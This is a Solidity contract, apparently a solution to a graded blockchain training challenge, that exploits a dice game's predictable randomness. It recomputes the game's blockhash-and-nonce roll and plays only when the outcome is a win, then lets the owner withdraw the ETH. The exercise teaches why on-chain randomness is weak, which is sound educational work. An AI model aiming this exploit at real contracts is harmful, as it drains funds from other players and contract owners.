pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    /////////////////
    /// Errors //////
    /////////////////

    error NotEnoughETH(uint256 required, uint256 available);
    error NotWinningRoll(uint256 roll);
    error InsufficientBalance(uint256 requested, uint256 available);

    //////////////////////
    /// State Variables //
    //////////////////////

    DiceGame public diceGame;

    ///////////////////
    /// Constructor ///
    ///////////////////

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    ///////////////////
    /// Functions /////
    ///////////////////

    receive() external payable {}

    function riggedRoll() external {
        uint256 required = 0.002 ether;
        uint256 available = address(this).balance;
        if (available < required) revert NotEnoughETH(required, available);

        bytes32 prevHash = blockhash(block.number - 1);
        uint256 nonce = diceGame.nonce();
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;

        // Only roll when we know we’ll win (matches the provided tests)
        if (roll > 5) revert NotWinningRoll(roll);

        diceGame.rollTheDice{value: required}();
    }

    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        uint256 available = address(this).balance;
        if (_amount > available) revert InsufficientBalance(_amount, available);
        (bool success, ) = payable(_addr).call{value: _amount}("");
        require(success, "Withdraw failed");
    }
}
